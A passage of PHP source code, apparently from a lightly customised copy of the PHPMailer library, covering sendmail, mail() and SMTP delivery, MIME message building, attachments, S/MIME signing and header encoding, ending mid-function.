            if ($this->Mailer == 'qmail') {
                $sendmailFmt = '%s';
            } else {
                $sendmailFmt = '%s -oi -t';
            }
        }
        $sendmail = sprintf($sendmailFmt, @escapeshellcmd($this->Sendmail), $this->Sender);
        if ($this->SingleTo) {
            foreach ($this->SingleToArray as $toAddr) {
                if (!@$mail = popen($sendmail, 'w')) {
                    throw new phpmailerException($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL);
                }
                fputs($mail, 'To: ' . $toAddr . "\n");
                fputs($mail, $header);
                fputs($mail, $body);
                $result = pclose($mail);
                $this->doCallback(($result == 0), array(
                    $toAddr
                ), $this->cc, $this->bcc, $this->Subject, $body, $this->From);
                if ($result != 0) {
                    throw new phpmailerException($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL);
                }
            }
        } else {
            if (!@$mail = popen($sendmail, 'w')) {
                throw new phpmailerException($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL);
            }
            fputs($mail, $header);
            fputs($mail, $body);
            $result = pclose($mail);
            $this->doCallback(($result == 0), $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From);
            if ($result != 0) {
                throw new phpmailerException($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL);
            }
        }
        return true;
    }
    protected static function isShellSafe($string) {
        if (@escapeshellcmd($string) !== $string or !in_array(@escapeshellarg($string), array(
            "'$string'",
            "\"$string\""
        ))) {
            return false;
        }
        $length = strlen($string);
        for ($i = 0; $i < $length; $i++) {
            $c = $string[$i];
            if (!ctype_alnum($c) && strpos('@_-.', $c) === false) {
                return false;
            }
        }
        return true;
    }
    protected function mailSend($header, $body) {
        $toArr = array();
        foreach ($this->to as $toaddr) {
            $toArr[] = $this->addrFormat($toaddr);
        }
        $to     = implode(', ', $toArr);
        $params = null;
        if (!empty($this->Sender) and $this->validateAddress($this->Sender)) {
            if (self::isShellSafe($this->Sender)) {
                $params = sprintf('-f%s', $this->Sender);
            }
        }
        if (!empty($this->Sender) and !ini_get('safe_mode') and $this->validateAddress($this->Sender)) {
            $old_from = ini_get('sendmail_from');
            ini_set('sendmail_from', $this->Sender);
        }
        $result = false;
        if ($this->SingleTo and count($toArr) > 1) {
            foreach ($toArr as $toAddr) {
                $result = $this->mailPassthru($toAddr, $this->Subject, $body, $header, $params);
                $this->doCallback($result, array(
                    $toAddr
                ), $this->cc, $this->bcc, $this->Subject, $body, $this->From);
            }
        } else {
            $result = $this->mailPassthru($to, $this->Subject, $body, $header, $params);
            $this->doCallback($result, $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From);
        }
        if (isset($old_from)) {
            ini_set('sendmail_from', $old_from);
        }
        if (!$result) {
            throw new phpmailerException($this->lang('instantiate'), self::STOP_CRITICAL);
        }
        return true;
    }
    public function getSMTPInstance() {
        if (!is_object($this->smtp)) {
            $this->smtp            = new SMTP;
            $this->smtp->UseSocks  = $this->UseSocks;
            $this->smtp->SocksHost = $this->SocksHost;
            $this->smtp->SocksPort = $this->SocksPort;
        }
        return $this->smtp;
    }
    protected function smtpSend($header, $body) {
        $bad_rcpt = array();
        if (!$this->smtpConnect($this->SMTPOptions)) {
            throw new phpmailerException($this->lang('smtp_connect_failed'), self::STOP_CRITICAL);
        }
        if (!empty($this->Sender) and $this->validateAddress($this->Sender)) {
            $smtp_from = $this->Sender;
        } else {
            $smtp_from = $this->From;
        }
        if (!$this->smtp->mail($smtp_from)) {
            $this->setError($this->lang('from_failed') . $smtp_from . ' : ' . implode(',', $this->smtp->getError()));
            throw new phpmailerException($this->ErrorInfo, self::STOP_CRITICAL);
        }
        foreach (array(
            $this->to,
            $this->cc,
            $this->bcc
        ) as $togroup) {
            foreach ($togroup as $to) {
                if (!$this->smtp->recipient($to[0])) {
                    $error      = $this->smtp->getError();
                    $bad_rcpt[] = array(
                        'to' => $to[0],
                        'error' => $error['detail']
                    );
                    $isSent     = false;
                } else {
                    $isSent = true;
                }
                $this->doCallback($isSent, array(
                    $to[0]
                ), array(), array(), $this->Subject, $body, $this->From);
            }
        }
        if ((count($this->all_recipients) > count($bad_rcpt)) and !$this->smtp->data($header . $body)) {
            throw new phpmailerException($this->lang('data_not_accepted'), self::STOP_CRITICAL);
        }
        if ($this->SMTPKeepAlive) {
            $this->smtp->reset();
        } else {
            $this->smtp->quit();
            $this->smtp->close();
        }
        if (count($bad_rcpt) > 0) {
            $errstr = '';
            foreach ($bad_rcpt as $bad) {
                $errstr .= $bad['to'] . ': ' . $bad['error'];
            }
            throw new phpmailerException($this->lang('recipients_failed') . $errstr, self::STOP_CONTINUE);
        }
        return true;
    }
    public function smtpConnect($options = null) {
        if (is_null($this->smtp)) {
            $this->smtp = $this->getSMTPInstance();
        }
        if (is_null($options)) {
            $options = $this->SMTPOptions;
        }
        if ($this->smtp->connected()) {
            return true;
        }
        $this->smtp->setTimeout($this->Timeout);
        $this->smtp->setDebugLevel($this->SMTPDebug);
        $this->smtp->setDebugOutput($this->Debugoutput);
        $this->smtp->setVerp($this->do_verp);
        $hosts         = explode(';', $this->Host);
        $lastexception = null;
        foreach ($hosts as $hostentry) {
            $hostinfo = array();
            if (!preg_match('/^((ssl|tls):\/\/)*([a-zA-Z0-9\.-]*):?([0-9]*)$/', trim($hostentry), $hostinfo)) {
                continue;
            }
            $prefix = '';
            $secure = $this->SMTPSecure;
            $tls    = ($this->SMTPSecure == 'tls');
            if ('ssl' == $hostinfo[2] or ('' == $hostinfo[2] and 'ssl' == $this->SMTPSecure)) {
                $prefix = 'ssl://';
                $tls    = false;
                $secure = 'ssl';
            } elseif ($hostinfo[2] == 'tls') {
                $tls    = true;
                $secure = 'tls';
            }
            $sslext = defined('OPENSSL_ALGO_SHA1');
            if ('tls' === $secure or 'ssl' === $secure) {
                if (!$sslext) {
                    throw new phpmailerException($this->lang('extension_missing') . 'openssl', self::STOP_CRITICAL);
                }
            }
            $host  = $hostinfo[3];
            $port  = $this->Port;
            $tport = (integer) $hostinfo[4];
            if ($tport > 0 and $tport < 65536) {
                $port = $tport;
            }
            if ($this->smtp->connect($prefix . $host, $port, $this->Timeout, $options)) {
                try {
                    if ($this->Helo) {
                        $hello = $this->Helo;
                    } else {
                        $hello = $this->serverHostname();
                    }
                    $this->smtp->hello($hello);
                    if ($this->SMTPAutoTLS and $sslext and $secure != 'ssl' and $this->smtp->getServerExt('STARTTLS')) {
                        $tls = true;
                    }
                    if ($tls) {
                        if (!$this->smtp->startTLS()) {
                            throw new phpmailerException($this->lang('connect_host'));
                        }
                        $this->smtp->hello($hello);
                    }
                    if ($this->SMTPAuth) {
                        if (!$this->smtp->authenticate($this->Username, $this->Password, $this->AuthType, $this->Realm, $this->Workstation)) {
                            throw new phpmailerException($this->lang('authenticate'));
                        }
                    }
                    return true;
                }
                catch (phpmailerException $exc) {
                    $lastexception = $exc;
                    $this->edebug($exc->getMessage());
                    $this->smtp->quit();
                }
            }
        }
        $this->smtp->close();
        if ($this->exceptions and !is_null($lastexception)) {
            throw $lastexception;
        }
        return false;
    }
    public function smtpClose() {
        if (is_a($this->smtp, 'SMTP')) {
            if ($this->smtp->connected()) {
                $this->smtp->quit();
                $this->smtp->close();
            }
        }
    }
    public function setLanguage($langcode = 'en', $lang_path = '') {
        $renamed_langcodes = array(
            'br' => 'pt_br',
            'cz' => 'cs',
            'dk' => 'da',
            'no' => 'nb',
            'se' => 'sv'
        );
        if (isset($renamed_langcodes[$langcode])) {
            $langcode = $renamed_langcodes[$langcode];
        }
        $PHPMAILER_LANG = array(
            'authenticate' => 'SMTP Error: Could not authenticate.',
            'connect_host' => 'SMTP Error: Could not connect to SMTP host.',
            'data_not_accepted' => 'SMTP Error: data not accepted.',
            'empty_message' => 'Message body empty',
            'encoding' => 'Unknown encoding: ',
            'execute' => 'Could not execute: ',
            'file_access' => 'Could not access file: ',
            'file_open' => 'File Error: Could not open file: ',
            'from_failed' => 'The following From address failed: ',
            'instantiate' => 'MAIL_DISABLED',
            'invalid_address' => 'Invalid address: ',
            'mailer_not_supported' => ' mailer is not supported.',
            'provide_address' => 'You must provide at least one recipient email address.',
            'recipients_failed' => 'SMTP Error: The following recipients failed: ',
            'signing' => 'Signing Error: ',
            'smtp_connect_failed' => 'SMTP connect() failed.',
            'smtp_error' => 'SMTP server error: ',
            'variable_set' => 'Cannot set or reset variable: ',
            'extension_missing' => 'Extension missing: '
        );
        if (empty($lang_path)) {
            $lang_path = dirname(__FILE__) . DIRECTORY_SEPARATOR . 'language' . DIRECTORY_SEPARATOR;
        }
        if (!preg_match('/^[a-z]{2}(?:_[a-zA-Z]{2})?$/', $langcode)) {
            $langcode = 'en';
        }
        $foundlang = true;
        $lang_file = $lang_path . 'phpmailer.lang-' . $langcode . '.php';
        if ($langcode != 'en') {
            if (!is_readable($lang_file)) {
                $foundlang = false;
            } else {
                $foundlang = include $lang_file;
            }
        }
        $this->language = $PHPMAILER_LANG;
        return (boolean) $foundlang;
    }
    public function getTranslations() {
        return $this->language;
    }
    public function addrAppend($type, $addr) {
        $addresses = array();
        foreach ($addr as $address) {
            $addresses[] = $this->addrFormat($address);
        }
        return $type . ': ' . implode(', ', $addresses) . $this->LE;
    }
    public function addrFormat($addr) {
        if (empty($addr[1])) {
            return $this->secureHeader($addr[0]);
        } else {
            return $this->encodeHeader($this->secureHeader($addr[1]), 'phrase') . ' <' . $this->secureHeader($addr[0]) . '>';
        }
    }
    public function wrapText($message, $length, $qp_mode = false) {
        if ($qp_mode) {
            $soft_break = sprintf(' =%s', $this->LE);
        } else {
            $soft_break = $this->LE;
        }
        $is_utf8 = (strtolower($this->CharSet) == 'utf-8');
        $lelen   = strlen($this->LE);
        $crlflen = strlen(self::CRLF);
        $message = $this->fixEOL($message);
        if (substr($message, -$lelen) == $this->LE) {
            $message = substr($message, 0, -$lelen);
        }
        $lines   = explode($this->LE, $message);
        $message = '';
        foreach ($lines as $line) {
            $words     = explode(' ', $line);
            $buf       = '';
            $firstword = true;
            foreach ($words as $word) {
                if ($qp_mode and (strlen($word) > $length)) {
                    $space_left = $length - strlen($buf) - $crlflen;
                    if (!$firstword) {
                        if ($space_left > 20) {
                            $len = $space_left;
                            if ($is_utf8) {
                                $len = $this->utf8CharBoundary($word, $len);
                            } elseif (substr($word, $len - 1, 1) == '=') {
                                $len--;
                            } elseif (substr($word, $len - 2, 1) == '=') {
                                $len -= 2;
                            }
                            $part = substr($word, 0, $len);
                            $word = substr($word, $len);
                            $buf .= ' ' . $part;
                            $message .= $buf . sprintf('=%s', self::CRLF);
                        } else {
                            $message .= $buf . $soft_break;
                        }
                        $buf = '';
                    }
                    while (strlen($word) > 0) {
                        if ($length <= 0) {
                            break;
                        }
                        $len = $length;
                        if ($is_utf8) {
                            $len = $this->utf8CharBoundary($word, $len);
                        } elseif (substr($word, $len - 1, 1) == '=') {
                            $len--;
                        } elseif (substr($word, $len - 2, 1) == '=') {
                            $len -= 2;
                        }
                        $part = substr($word, 0, $len);
                        $word = substr($word, $len);
                        if (strlen($word) > 0) {
                            $message .= $part . sprintf('=%s', self::CRLF);
                        } else {
                            $buf = $part;
                        }
                    }
                } else {
                    $buf_o = $buf;
                    if (!$firstword) {
                        $buf .= ' ';
                    }
                    $buf .= $word;
                    if (strlen($buf) > $length and $buf_o != '') {
                        $message .= $buf_o . $soft_break;
                        $buf = $word;
                    }
                }
                $firstword = false;
            }
            $message .= $buf . self::CRLF;
        }
        return $message;
    }
    public function utf8CharBoundary($encodedText, $maxLength) {
        $foundSplitPos = false;
        $lookBack      = 3;
        while (!$foundSplitPos) {
            $lastChunk      = substr($encodedText, $maxLength - $lookBack, $lookBack);
            $encodedCharPos = strpos($lastChunk, '=');
            if (false !== $encodedCharPos) {
                $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2);
                $dec = hexdec($hex);
                if ($dec < 128) {
                    if ($encodedCharPos > 0) {
                        $maxLength = $maxLength - ($lookBack - $encodedCharPos);
                    }
                    $foundSplitPos = true;
                } elseif ($dec >= 192) {
                    $maxLength     = $maxLength - ($lookBack - $encodedCharPos);
                    $foundSplitPos = true;
                } elseif ($dec < 192) {
                    $lookBack += 3;
                }
            } else {
                $foundSplitPos = true;
            }
        }
        return $maxLength;
    }
    public function setWordWrap() {
        if ($this->WordWrap < 1) {
            return;
        }
        switch ($this->message_type) {
            case 'alt':
            case 'alt_inline':
            case 'alt_attach':
            case 'alt_inline_attach':
                $this->AltBody = $this->wrapText($this->AltBody, $this->WordWrap);
                break;
            default:
                $this->Body = $this->wrapText($this->Body, $this->WordWrap);
                break;
        }
    }
    public function createHeader() {
        $result = '';
        if ($this->MessageDate == '') {
            $this->MessageDate = self::rfcDate();
        }
        $result .= $this->headerLine('Date', $this->MessageDate);
        if ($this->SingleTo) {
            if ($this->Mailer != 'mail') {
                foreach ($this->to as $toaddr) {
                    $this->SingleToArray[] = $this->addrFormat($toaddr);
                }
            }
        } else {
            if (count($this->to) > 0) {
                if ($this->Mailer != 'mail') {
                    $result .= $this->addrAppend('To', $this->to);
                }
            } elseif (count($this->cc) == 0) {
                $result .= $this->headerLine('To', 'undisclosed-recipients:;');
            }
        }
        $result .= $this->addrAppend('From', array(
            array(
                trim($this->From),
                $this->FromName
            )
        ));
        if (count($this->cc) > 0) {
            $result .= $this->addrAppend('Cc', $this->cc);
        }
        if (($this->Mailer == 'sendmail' or $this->Mailer == 'qmail' or $this->Mailer == 'mail') and count($this->bcc) > 0) {
            $result .= $this->addrAppend('Bcc', $this->bcc);
        }
        if (count($this->ReplyTo) > 0) {
            $result .= $this->addrAppend('Reply-To', $this->ReplyTo);
        }
        if ($this->Mailer != 'mail') {
            $result .= $this->headerLine('Subject', $this->encodeHeader($this->secureHeader($this->Subject)));
        }
        if ('' != $this->MessageID and preg_match('/^<.*@.*>$/', $this->MessageID)) {
            $this->lastMessageID = $this->MessageID;
        } else {
            $this->lastMessageID = sprintf('<%s@%s>', $this->uniqueid, $this->serverHostname());
        }
        $result .= $this->headerLine('Message-ID', $this->lastMessageID);
        if (!is_null($this->Priority)) {
            $result .= $this->headerLine('X-Priority', $this->Priority);
        }
        if ($this->ConfirmReadingTo != '') {
            $result .= $this->headerLine('Disposition-Notification-To', '<' . $this->ConfirmReadingTo . '>');
        }
        foreach ($this->CustomHeader as $header) {
            $result .= $this->headerLine(trim($header[0]), $this->encodeHeader(trim($header[1])));
        }
        if (!$this->sign_key_file) {
            $result .= $this->headerLine('MIME-Version', '1.0');
            $result .= $this->getMailMIME();
        }
        return $result;
    }
    public function getMailMIME() {
        $result      = '';
        $ismultipart = true;
        switch ($this->message_type) {
            case 'inline':
                $result .= $this->headerLine('Content-Type', 'multipart/related;');
                $result .= $this->textLine("\tboundary=\"" . $this->boundary[1] . '"');
                break;
            case 'attach':
            case 'inline_attach':
            case 'alt_attach':
            case 'alt_inline_attach':
                $result .= $this->headerLine('Content-Type', 'multipart/mixed;');
                $result .= $this->textLine("\tboundary=\"" . $this->boundary[1] . '"');
                break;
            case 'alt':
            case 'alt_inline':
                $result .= $this->headerLine('Content-Type', 'multipart/alternative;');
                $result .= $this->textLine("\tboundary=\"" . $this->boundary[1] . '"');
                break;
            default:
                $result .= $this->textLine('Content-Type: ' . $this->ContentType . '; charset=' . $this->CharSet);
                $ismultipart = false;
                break;
        }
        if ($this->Encoding != '7bit') {
            if ($ismultipart) {
                if ($this->Encoding == '8bit') {
                    $result .= $this->headerLine('Content-Transfer-Encoding', '8bit');
                }
            } else {
                $result .= $this->headerLine('Content-Transfer-Encoding', $this->Encoding);
            }
        }
        if ($this->Mailer != 'mail') {
            $result .= $this->LE;
        }
        return $result;
    }
    public function getSentMIMEMessage() {
        return rtrim($this->MIMEHeader . $this->mailHeader, "\n\r") . self::CRLF . self::CRLF . $this->MIMEBody;
    }
    protected function generateId() {
        return md5(uniqid(time()));
    }
    public function createBody() {
        $body              = '';
        $this->uniqueid    = $this->generateId();
        $this->boundary[1] = 'b1_' . $this->uniqueid;
        $this->boundary[2] = 'b2_' . $this->uniqueid;
        $this->boundary[3] = 'b3_' . $this->uniqueid;
        if ($this->sign_key_file) {
            $body .= $this->getMailMIME() . $this->LE;
        }
        $this->setWordWrap();
        $bodyEncoding = $this->Encoding;
        $bodyCharSet  = $this->CharSet;
        if ($bodyEncoding == '8bit' and !$this->has8bitChars($this->Body)) {
            $bodyEncoding = '7bit';
            $bodyCharSet  = 'us-ascii';
        }
        if ('base64' != $this->Encoding and self::hasLineLongerThanMax($this->Body)) {
            $bodyEncoding = 'quoted-printable';
        }
        $altBodyEncoding = $this->Encoding;
        $altBodyCharSet  = $this->CharSet;
        if ($altBodyEncoding == '8bit' and !$this->has8bitChars($this->AltBody)) {
            $altBodyEncoding = '7bit';
            $altBodyCharSet  = 'us-ascii';
        }
        if ('base64' != $altBodyEncoding and self::hasLineLongerThanMax($this->AltBody)) {
            $altBodyEncoding = 'quoted-printable';
        }
        $mimepre = "This is a multi-part message in MIME format." . $this->LE . $this->LE;
        switch ($this->message_type) {
            case 'inline':
                $body .= $mimepre;
                $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->attachAll('inline', $this->boundary[1]);
                break;
            case 'attach':
                $body .= $mimepre;
                $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->attachAll('attachment', $this->boundary[1]);
                break;
            case 'inline_attach':
                $body .= $mimepre;
                $body .= $this->textLine('--' . $this->boundary[1]);
                $body .= $this->headerLine('Content-Type', 'multipart/related;');
                $body .= $this->textLine("\tboundary=\"" . $this->boundary[2] . '"');
                $body .= $this->LE;
                $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, '', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->attachAll('inline', $this->boundary[2]);
                $body .= $this->LE;
                $body .= $this->attachAll('attachment', $this->boundary[1]);
                break;
            case 'alt':
                $body .= $mimepre;
                $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, 'text/plain', $altBodyEncoding);
                $body .= $this->encodeString($this->AltBody, $altBodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, 'text/html', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                if (!empty($this->Ical)) {
                    $body .= $this->getBoundary($this->boundary[1], '', 'text/calendar; method=REQUEST', '');
                    $body .= $this->encodeString($this->Ical, $this->Encoding);
                    $body .= $this->LE . $this->LE;
                }
                $body .= $this->endBoundary($this->boundary[1]);
                break;
            case 'alt_inline':
                $body .= $mimepre;
                $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, 'text/plain', $altBodyEncoding);
                $body .= $this->encodeString($this->AltBody, $altBodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->textLine('--' . $this->boundary[1]);
                $body .= $this->headerLine('Content-Type', 'multipart/related;');
                $body .= $this->textLine("\tboundary=\"" . $this->boundary[2] . '"');
                $body .= $this->LE;
                $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, 'text/html', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->attachAll('inline', $this->boundary[2]);
                $body .= $this->LE;
                $body .= $this->endBoundary($this->boundary[1]);
                break;
            case 'alt_attach':
                $body .= $mimepre;
                $body .= $this->textLine('--' . $this->boundary[1]);
                $body .= $this->headerLine('Content-Type', 'multipart/alternative;');
                $body .= $this->textLine("\tboundary=\"" . $this->boundary[2] . '"');
                $body .= $this->LE;
                $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, 'text/plain', $altBodyEncoding);
                $body .= $this->encodeString($this->AltBody, $altBodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, 'text/html', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->endBoundary($this->boundary[2]);
                $body .= $this->LE;
                $body .= $this->attachAll('attachment', $this->boundary[1]);
                break;
            case 'alt_inline_attach':
                $body .= $mimepre;
                $body .= $this->textLine('--' . $this->boundary[1]);
                $body .= $this->headerLine('Content-Type', 'multipart/alternative;');
                $body .= $this->textLine("\tboundary=\"" . $this->boundary[2] . '"');
                $body .= $this->LE;
                $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, 'text/plain', $altBodyEncoding);
                $body .= $this->encodeString($this->AltBody, $altBodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->textLine('--' . $this->boundary[2]);
                $body .= $this->headerLine('Content-Type', 'multipart/related;');
                $body .= $this->textLine("\tboundary=\"" . $this->boundary[3] . '"');
                $body .= $this->LE;
                $body .= $this->getBoundary($this->boundary[3], $bodyCharSet, 'text/html', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->attachAll('inline', $this->boundary[3]);
                $body .= $this->LE;
                $body .= $this->endBoundary($this->boundary[2]);
                $body .= $this->LE;
                $body .= $this->attachAll('attachment', $this->boundary[1]);
                break;
            default:
                $this->Encoding = $bodyEncoding;
                $body .= $this->encodeString($this->Body, $this->Encoding);
                break;
        }
        if ($this->isError()) {
            $body = '';
        } elseif ($this->sign_key_file) {
            try {
                if (!defined('PKCS7_TEXT')) {
                    throw new phpmailerException($this->lang('extension_missing') . 'openssl');
                }
                $file = tempnam(sys_get_temp_dir(), 'mail');
                if (false === @file_put_contents($file, $body)) {
                    throw new phpmailerException($this->lang('signing') . ' Could not write temp file');
                }
                $signed = tempnam(sys_get_temp_dir(), 'signed');
                if (empty($this->sign_extracerts_file)) {
                    $sign = @openssl_pkcs7_sign($file, $signed, 'file://' . realpath($this->sign_cert_file), array(
                        'file://' . realpath($this->sign_key_file),
                        $this->sign_key_pass
                    ), null);
                } else {
                    $sign = @openssl_pkcs7_sign($file, $signed, 'file://' . realpath($this->sign_cert_file), array(
                        'file://' . realpath($this->sign_key_file),
                        $this->sign_key_pass
                    ), null, PKCS7_DETACHED, $this->sign_extracerts_file);
                }
                if ($sign) {
                    @unlink($file);
                    $body = @file_get_contents($signed);
                    @unlink($signed);
                    $parts = explode("\n\n", $body, 2);
                    $this->MIMEHeader .= $parts[0] . $this->LE . $this->LE;
                    $body = $parts[1];
                } else {
                    @unlink($file);
                    @unlink($signed);
                    throw new phpmailerException($this->lang('signing') . openssl_error_string());
                }
            }
            catch (phpmailerException $exc) {
                $body = '';
                if ($this->exceptions) {
                    throw $exc;
                }
            }
        }
        return $body;
    }
    protected function getBoundary($boundary, $charSet, $contentType, $encoding) {
        $result = '';
        if ($charSet == '') {
            $charSet = $this->CharSet;
        }
        if ($contentType == '') {
            $contentType = $this->ContentType;
        }
        if ($encoding == '') {
            $encoding = $this->Encoding;
        }
        $result .= $this->textLine('--' . $boundary);
        $result .= sprintf('Content-Type: %s; charset=%s', $contentType, $charSet);
        $result .= $this->LE;
        if ($encoding != '7bit') {
            $result .= $this->headerLine('Content-Transfer-Encoding', $encoding);
        }
        $result .= $this->LE;
        return $result;
    }
    protected function endBoundary($boundary) {
        return $this->LE . '--' . $boundary . '--' . $this->LE;
    }
    protected function setMessageType() {
        $type = array();
        if ($this->alternativeExists()) {
            $type[] = 'alt';
        }
        if ($this->inlineImageExists()) {
            $type[] = 'inline';
        }
        if ($this->attachmentExists()) {
            $type[] = 'attach';
        }
        $this->message_type = implode('_', $type);
        if ($this->message_type == '') {
            $this->message_type = 'plain';
        }
    }
    public function headerLine($name, $value) {
        return $name . ': ' . $value . $this->LE;
    }
    public function textLine($value) {
        return $value . $this->LE;
    }
    public function addAttachment($path, $name = '', $encoding = 'base64', $type = '', $disposition = 'attachment') {
        try {
            if (!@is_file($path)) {
                throw new phpmailerException($this->lang('file_access') . $path, self::STOP_CONTINUE);
            }
            if ($type == '') {
                $type = self::filenameToType($path);
            }
            $filename = basename($path);
            if ($name == '') {
                $name = $filename;
            }
            $this->attachment[] = array(
                0 => $path,
                1 => $filename,
                2 => $name,
                3 => $encoding,
                4 => $type,
                5 => false,
                6 => $disposition,
                7 => 0
            );
        }
        catch (phpmailerException $exc) {
            $this->setError($exc->getMessage());
            $this->edebug($exc->getMessage());
            if ($this->exceptions) {
                throw $exc;
            }
            return false;
        }
        return true;
    }
    public function getAttachments() {
        return $this->attachment;
    }
    protected function attachAll($disposition_type, $boundary) {
        $mime    = array();
        $cidUniq = array();
        $incl    = array();
        foreach ($this->attachment as $attachment) {
            if ($attachment[6] == $disposition_type) {
                $string  = '';
                $path    = '';
                $bString = $attachment[5];
                if ($bString) {
                    $string = $attachment[0];
                } else {
                    $path = $attachment[0];
                }
                $inclhash = md5(serialize($attachment));
                if (in_array($inclhash, $incl)) {
                    continue;
                }
                $incl[]      = $inclhash;
                $name        = $attachment[2];
                $encoding    = $attachment[3];
                $type        = $attachment[4];
                $disposition = $attachment[6];
                $cid         = $attachment[7];
                if ($disposition == 'inline' && array_key_exists($cid, $cidUniq)) {
                    continue;
                }
                $cidUniq[$cid] = true;
                $mime[]        = sprintf('--%s%s', $boundary, $this->LE);
                if (!empty($name)) {
                    $mime[] = sprintf('Content-Type: %s; name="%s"%s', $type, $this->encodeHeader($this->secureHeader($name)), $this->LE);
                } else {
                    $mime[] = sprintf('Content-Type: %s%s', $type, $this->LE);
                }
                if ($encoding != '7bit') {
                    $mime[] = sprintf('Content-Transfer-Encoding: %s%s', $encoding, $this->LE);
                }
                if ($disposition == 'inline') {
                    $mime[] = sprintf('Content-ID: <%s>%s', $cid, $this->LE);
                }
                if (!(empty($disposition))) {
                    $encoded_name = $this->encodeHeader($this->secureHeader($name));
                    if (preg_match('/[ \(\)<>@,;:\\"\/\[\]\?=]/', $encoded_name)) {
                        $mime[] = sprintf('Content-Disposition: %s; filename="%s"%s', $disposition, $encoded_name, $this->LE . $this->LE);
                    } else {
                        if (!empty($encoded_name)) {
                            $mime[] = sprintf('Content-Disposition: %s; filename=%s%s', $disposition, $encoded_name, $this->LE . $this->LE);
                        } else {
                            $mime[] = sprintf('Content-Disposition: %s%s', $disposition, $this->LE . $this->LE);
                        }
                    }
                } else {
                    $mime[] = $this->LE;
                }
                if ($bString) {
                    $mime[] = $this->encodeString($string, $encoding);
                    if ($this->isError()) {
                        return '';
                    }
                    $mime[] = $this->LE . $this->LE;
                } else {
                    $mime[] = $this->encodeFile($path, $encoding);
                    if ($this->isError()) {
                        return '';
                    }
                    $mime[] = $this->LE . $this->LE;
                }
            }
        }
        $mime[] = sprintf('--%s--%s', $boundary, $this->LE);
        return implode('', $mime);
    }
    protected function encodeFile($path, $encoding = 'base64') {
        try {
            if (!is_readable($path)) {
                throw new phpmailerException($this->lang('file_open') . $path, self::STOP_CONTINUE);
            }
            $magic_quotes = get_magic_quotes_runtime();
            if ($magic_quotes) {
                if (version_compare(PHP_VERSION, '5.3.0', '<')) {
                    set_magic_quotes_runtime(false);
                } else {
                    ini_set('magic_quotes_runtime', false);
                }
            }
            $file_buffer = @file_get_contents($path);
            $file_buffer = $this->encodeString($file_buffer, $encoding);
            if ($magic_quotes) {
                if (version_compare(PHP_VERSION, '5.3.0', '<')) {
                    set_magic_quotes_runtime($magic_quotes);
                } else {
                    ini_set('magic_quotes_runtime', $magic_quotes);
                }
            }
            return $file_buffer;
        }
        catch (Exception $exc) {
            $this->setError($exc->getMessage());
            return '';
        }
    }
    public function encodeString($str, $encoding = 'base64') {
        $encoded = '';
        switch (strtolower($encoding)) {
            case 'base64':
                $encoded = chunk_split(base64_encode($str), 76, $this->LE);
                break;
            case '7bit':
            case '8bit':
                $encoded = $this->fixEOL($str);
                if (substr($encoded, -(strlen($this->LE))) != $this->LE) {
                    $encoded .= $this->LE;
                }
                break;
            case 'binary':
                $encoded = $str;
                break;
            case 'quoted-printable':
                $encoded = $this->encodeQP($str);
                break;
            default:
                $this->setError($this->lang('encoding') . $encoding);
                break;
        }
        return $encoded;
    }
    public function encodeHeader($str, $position = 'text') {
        $matchcount = 0;
        switch (strtolower($position)) {
            case 'phrase':
                if (!preg_match('/[\200-\377]/', $str)) {
                    $encoded = addcslashes($str, "\0..\37\177\\\"");
                    if (($str == $encoded) && !preg_match('/[^A-Za-z0-9!#$%&\'*+\/=?^_`{|}~ -]/', $str)) {
                        return ($encoded);
                    } else {
                        return ("\"$encoded\"");
                    }
                }
                $matchcount = preg_match_all('/[^\040\041\043-\133\135-\176]/', $str, $matches);
                break;
            case 'comment':
                $matchcount = preg_match_all('/[()"]/', $str, $matches);
            case 'text':
            default:
                $matchcount += preg_match_all('/[\000-\010\013\014\016-\037\177-\377]/', $str, $matches);
                break;
        }
        if ($matchcount == 0) {
            return ($str);
        }
        $maxlen = 75 - 7 - strlen($this->CharSet);
        if ($matchcount > strlen($str) / 3) {
            $encoding = 'B';
            if (function_exists('mb_strlen') && $this->hasMultiBytes($str)) {
                $encoded = $this->base64EncodeWrapMB($str, "\n");
            } else {
                $encoded = base64_encode($str);
                $maxlen -= $maxlen % 4;
                $encoded = trim(chunk_split($encoded, $maxlen, "\n"));
            }
        } else {
            $encoding = 'Q';
            $encoded  = $this->encodeQ($str, $position);
            $encoded  = $this->wrapText($encoded, $maxlen, true);
            $encoded  = str_replace('=' . self::CRLF, "\n", trim($encoded));
        }
        $encoded = preg_replace('/^(.*)$/m', ' =?' . $this->CharSet . "?$encoding?\\1?=", $encoded);
        $encoded = trim(str_replace("\n", $this->LE, $encoded));
